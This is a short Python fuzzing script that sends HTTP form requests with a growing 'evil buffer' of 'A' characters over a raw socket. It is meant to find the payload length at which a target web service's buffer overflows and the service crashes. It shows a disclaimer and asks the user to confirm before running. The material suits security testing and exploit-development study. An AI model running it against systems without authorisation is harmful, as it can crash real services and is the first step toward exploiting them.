#!/usr/bin/python3
import socket
import time
import sys

if len(sys.argv) != 8:
    print("\n Usage : " + sys.argv[0] + " <request file> <host ip> <port> <target form tag name> <start length> <step size> <end length>")
    sys.exit(1)

print("================================")
print("            Fuzzer")
print("--------------------------------")
print("    created by Xanthorrhizol")
print(" (xanthorrhizol@protonmail.com)")
print("================================")
print("\nIt is a python script to find max buffer size.")
print("\nIt can crash the target system.\nDON'T USE THIS FOR ATTACK OTHER SYSTEM.\nThe creater don't take responsability for other user's usage.\n\n")
agree = input("Agree and start?[y/N]\t")
if agree != "y" and agree != "Y":
    sys.exit(0)
print("---")
host = sys.argv[2]
port = int(sys.argv[3])
targetform = sys.argv[4]
startlen = int(sys.argv[5])
step = int(sys.argv[6])
endlen = int(sys.argv[7])
size = startlen - 1

while(size <= endlen):
    try:
        if size < startlen:
            print("\nBorder case test")
        else:
            print()
        print("Sending evil buffer with " + str(size) + " bytes")
        buffer = ""
        inputBuffer = "A" * size
        f = open(sys.argv[1], 'r')
        line = f.readline().replace("\n","\r\n")
        while len(line) > 0:
            if len(line.split("Content-Length")) > 1:
                line = "Content-Length: {to modify}\r\n"
            if len(line.split(targetform)) > 1:
                content = targetform + "=" + inputBuffer + "&" + line.split(targetform)[1].split("&")[1]
                line = content
            buffer += line
            line = f.readline().replace("\n","\r\n")
        f.close()
        buffer = buffer.replace("{to modify}", str(len(content)))
        #print(bytes(buffer, "utf-8")) # debug
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        s.send(bytes(buffer, "utf-8"))
        s.close()
        size += step
        time.sleep(3)
    except:
        if size > startlen - 1:
            print("\nSUCCESS : The buffer is overflowed by payload length "+ str(size))
        else:
            print("\nFAIL : Could not connect")
        sys.exit(1)
print("\nFAIL : The buffer is not overflowed")
